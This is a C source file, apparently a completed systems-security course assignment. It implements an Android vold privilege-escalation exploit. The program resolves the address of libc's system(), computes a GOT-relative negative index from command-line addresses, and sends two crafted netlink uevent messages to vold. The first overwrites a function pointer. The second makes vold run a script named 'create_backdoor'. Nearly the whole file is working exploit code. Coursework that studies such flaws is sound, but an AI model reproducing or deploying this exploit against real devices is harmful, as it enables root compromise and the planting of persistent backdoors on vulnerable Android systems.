/*
Modified by Yasanka Horawalavithana
Assignment 04 | Sys Sec
Run: ./exploit <GOT_ADDR> <PTR_ADDR> <PID_vold>
E.g., ./exploit 0x00014368 0x00016208 29
*/
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>

static void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

static void *find_system()
{
    char *system = "system";
    void *r = NULL;
    void *dlh = dlopen("/system/libc/libc.so", RTLD_NOW);

    if (!dlh)
        exit(errno);
    if ((r = (void *)dlsym(dlh, system)) == NULL)
        exit(errno);
    dlclose(dlh);
    return r;
}

static int send_msgs(uint32_t idx, uint32_t pid)
{

  //*****************************************************************
    char buf[0x1000]; // buf should contain the string you crafted.
  //*****************************************************************
    
    struct sockaddr_nl snl;
    struct iovec iov = {buf, sizeof(buf)};
    struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
    int sock = -1, n = 0;
    
    usleep(200000);
    memset(buf, 0, sizeof(buf));
    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    
    // Open socket to talk to vold via netlink
    if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
        die("[-] socket");
    snl.nl_pid = pid;
    
    //**********************************************************************
    //****Write your code here to craft first string and write into *buf****
    //**********************************************************************
    uint32_t systemaddress=(uint32_t)find_system();
    printf("Using system address: 0x%x,%d\n", systemaddress,systemaddress);

    printf("[offset]: %d\n", -idx);
        
    printf("[pid]: %d\n", pid);

    // craft the first message, pass system address and negative offset
    msg.msg_iov->iov_len = snprintf(buf, sizeof(buf), 
    "@/foo%cACTION=add%cSUBSYSTEM=block%cDEVPATH=/devices/platform/goldfish_mmc.0%cMAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=%d"
    ,0,0,0,0,0,systemaddress,0,0,-idx);

    
    printf("Message 01 Length: %d\n",msg.msg_iov->iov_len);

    //**********************************************************************
    
    n = sendmsg(sock, &msg, 0);
    if (n < 0) {
        printf("Error send.");
        close(sock);
        return n;
    }

    usleep(500000);

   
    // //***************************************************************************
    // //****Write your code here to craft the second string and write into *buf****
    // //***************************************************************************
    
    // craft the second message, pass the argument to run with system()
    msg.msg_iov->iov_len = snprintf(buf, sizeof(buf), 
    "@/foo%cACTION=add%cSUBSYSTEM=block%cDEVPATH=/devices/platform/goldfish_mmc.0%cMAJOR=%s%cMINOR=1%cDEVTYPE=harder%cPARTN=1"
    ,0,0,0,0,"sh /data/local/tmp/create_backdoor",0,0,0);

    
    //**********************************************************************
    printf("Message 02 Length: %d\n",msg.msg_iov->iov_len);
    //msg.msg_iov->iov_len = /* put your second string's length here. */;

    //**********************************************************************
    
    n = sendmsg(sock, &msg, 0);
    
    close(sock);
    
    return n;
}



int main(int argc, char **argv, char **env)
{
    //****Write your code here to get user input, caculate idx and send_msgs****
    //Usage: exploit <GOT_ADDR> <PTR_ADDR> <PID_vold>
    long gotaddress, pointeraddress;
    uint32_t vold_pid,offset;
    
    if(argc>3){
        /* Take the GOT address */
        gotaddress  = strtoul(argv[1], NULL, 0);
        printf("Using GOT address: 0x%x,%ld\n", gotaddress, gotaddress);
        
        /* Take the pointer address */
        pointeraddress  = strtoul(argv[2], NULL, 0);
        printf("Using pointer address: 0x%x,%ld\n", pointeraddress, pointeraddress);
        
        /* Take the offset */
        offset=(pointeraddress-gotaddress)/4;
        printf("Calculated offset: %d\n", offset);

        vold_pid  = atoi(argv[3]);
        printf("Using VOLD process id: %d\n", vold_pid);

        send_msgs(offset,vold_pid);
        
    }else{
        printf("Usage: exploit <GOT_ADDR> <PTR_ADDR> <PID_vold>\n");
    }
    
    return 0;
}